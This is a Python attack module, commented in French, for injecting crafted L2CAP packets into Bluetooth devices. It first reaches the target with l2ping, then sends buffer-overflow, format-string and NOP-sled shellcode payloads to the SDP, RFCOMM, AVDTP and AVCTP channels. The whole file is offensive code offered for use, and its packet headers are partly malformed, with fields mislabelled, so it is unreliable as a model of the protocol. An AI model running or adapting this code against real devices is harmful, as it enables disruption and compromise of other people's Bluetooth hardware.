#!/usr/bin/env python3
"""
Module d'attaque L2CAP Injection - Injection de paquets L2CAP malveillants
"""

import subprocess
import socket
import struct
import time
import random
from typing import Optional, Callable

class L2CAPInjectionAttack:
    def __init__(self, config: dict, callback: Optional[Callable] = None):
        self.config = config
        self.callback = callback
        self.running = False
        
    def execute(self, target_address: str, payload: bytes = None) -> bool:
        """Exécuter l'attaque L2CAP Injection"""
        try:
            self.running = True
            self._log("Démarrage de l'attaque L2CAP Injection...", "info")
            
            # Vérifier la connectivité L2CAP
            if not self._check_l2cap_connectivity(target_address):
                self._log("Cible non accessible via L2CAP", "error")
                return False
                
            # Créer le payload si aucun fourni
            if not payload:
                payload = self._create_malicious_payload()
                
            # Injecter le payload via différents canaux L2CAP
            success = False
            
            # Canal SDP (1)
            if self._inject_l2cap_packet(target_address, 1, payload):
                self._log("Injection réussie sur canal SDP", "success")
                success = True
                
            # Canal RFCOMM (3)
            if self._inject_l2cap_packet(target_address, 3, payload):
                self._log("Injection réussie sur canal RFCOMM", "success")
                success = True
                
            # Canal AVDTP (25)
            if self._inject_l2cap_packet(target_address, 25, payload):
                self._log("Injection réussie sur canal AVDTP", "success")
                success = True
                
            # Canal AVCTP (27)
            if self._inject_l2cap_packet(target_address, 27, payload):
                self._log("Injection réussie sur canal AVCTP", "success")
                success = True
                
            if success:
                self._log("Attaque L2CAP Injection terminée avec succès!", "success")
                return True
            else:
                self._log("Aucune injection réussie", "warning")
                return False
                
        except Exception as e:
            self._log(f"Erreur lors de l'attaque L2CAP Injection: {e}", "error")
            return False
        finally:
            self.running = False
            
    def _check_l2cap_connectivity(self, target_address: str) -> bool:
        """Vérifier la connectivité L2CAP"""
        try:
            self._log("Vérification de la connectivité L2CAP...", "info")
            
            # Utiliser l2ping pour tester la connectivité
            cmd = ['l2ping', '-c', '1', target_address]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            
            if result.returncode == 0:
                self._log("Connectivité L2CAP confirmée", "info")
                return True
            else:
                self._log("Pas de connectivité L2CAP", "warning")
                return False
                
        except Exception as e:
            self._log(f"Erreur lors de la vérification L2CAP: {e}", "error")
            return False
            
    def _inject_l2cap_packet(self, target_address: str, psm: int, payload: bytes) -> bool:
        """Injecter un paquet L2CAP sur un canal spécifique"""
        try:
            self._log(f"Tentative d'injection sur PSM {psm}...", "info")
            
            # Créer un socket L2CAP
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
            sock.settimeout(5)
            
            # Se connecter au PSM spécifié
            sock.connect((target_address, psm))
            
            # Créer le paquet L2CAP malveillant
            l2cap_packet = self._create_l2cap_packet(psm, payload)
            
            # Envoyer le paquet
            sock.send(l2cap_packet)
            
            # Attendre une réponse
            try:
                response = sock.recv(1024)
                if response:
                    self._log(f"Réponse reçue sur PSM {psm}: {len(response)} octets", "info")
            except socket.timeout:
                self._log(f"Aucune réponse sur PSM {psm}", "warning")
                
            sock.close()
            return True
            
        except socket.error as e:
            self._log(f"Erreur socket sur PSM {psm}: {e}", "warning")
            return False
        except Exception as e:
            self._log(f"Erreur lors de l'injection sur PSM {psm}: {e}", "error")
            return False
            
    def _create_l2cap_packet(self, psm: int, payload: bytes) -> bytes:
        """Créer un paquet L2CAP malveillant"""
        # Header L2CAP
        packet = struct.pack('<H', len(payload) + 4)  # Length (sans le header)
        packet += struct.pack('<H', 0x0001)  # CID (Control Channel)
        
        # Données de contrôle L2CAP
        packet += struct.pack('<H', 0x0001)  # Code (Command Reject)
        packet += struct.pack('<H', len(payload))  # Identifier
        
        # Payload malveillant
        packet += payload
        
        return packet
        
    def _create_malicious_payload(self) -> bytes:
        """Créer un payload malveillant"""
        payload_type = self.config.get('payload_type', 'buffer_overflow')
        
        if payload_type == 'buffer_overflow':
            # Payload pour déborder le buffer
            return b'A' * 1024  # 1KB de données
            
        elif payload_type == 'format_string':
            # Payload pour attaque format string
            return b'%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x'
            
        elif payload_type == 'shellcode':
            # Payload avec shellcode simple
            return self._create_shellcode()
            
        else:
            # Payload par défaut
            return b'\x90' * 512  # NOP sled
            
    def _create_shellcode(self) -> bytes:
        """Créer un shellcode simple"""
        # Shellcode Linux x86 simple (exit(0))
        shellcode = (
            b'\x31\xc0'      # xor eax, eax
            b'\x40'          # inc eax
            b'\x31\xdb'      # xor ebx, ebx
            b'\xcd\x80'      # int 0x80
        )
        
        # Ajouter un NOP sled
        nop_sled = b'\x90' * 100
        
        return nop_sled + shellcode
        
    def _log(self, message: str, level: str = "info"):
        """Logger un message"""
        if self.callback:
            self.callback(message, level)
        else:
            print(f"[{level.upper()}] {message}")
            
    def stop(self):
        """Arrêter l'attaque"""
        self.running = False
